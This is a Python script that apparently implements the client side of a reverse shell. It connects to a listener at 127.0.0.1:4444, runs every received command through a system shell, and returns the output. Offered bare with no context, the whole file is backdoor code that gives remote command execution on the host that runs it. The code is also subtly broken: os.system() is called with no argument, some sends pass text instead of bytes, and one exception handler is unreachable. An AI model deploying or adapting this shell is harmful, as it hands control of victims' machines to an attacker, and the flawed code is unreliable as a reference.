import socket
import traceback
import os
import subprocess

host = '127.0.0.1'
port = 4444

quit_list = ['quit', 'exit', 'close', 'break', 'kill', 'bye']
command_list = ['mkdir', 'touch', 'cp', 'echo'] 
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))

while True:
    try:
        comm = client.recv(1024).decode('utf-8')
        if comm in quit_list:
            break
        elif comm[:3] == 'cd ':
            try:
                os.chdir(comm[3:])
            except FileNotFoundError:
                client.send(f'[client] {comm[3:]} not found!')
        elif comm in command_list:
            os.system()
        else:
            output = subprocess.check_output(comm, text=True, shell=True)
            if output:
                client.send(output.encode('utf-8'))
            else:
                client.send('\n[client] NO OUTPUT WAS GENERATED!\n')
    except Exception as e:
        client.send(f'[client] Error: {e}'.encode('utf-8'))
    except subprocess.CalledProcessError as e:
        client.send(f'[client] Error: {e}'.encode('utf-8'))
        
client.close()

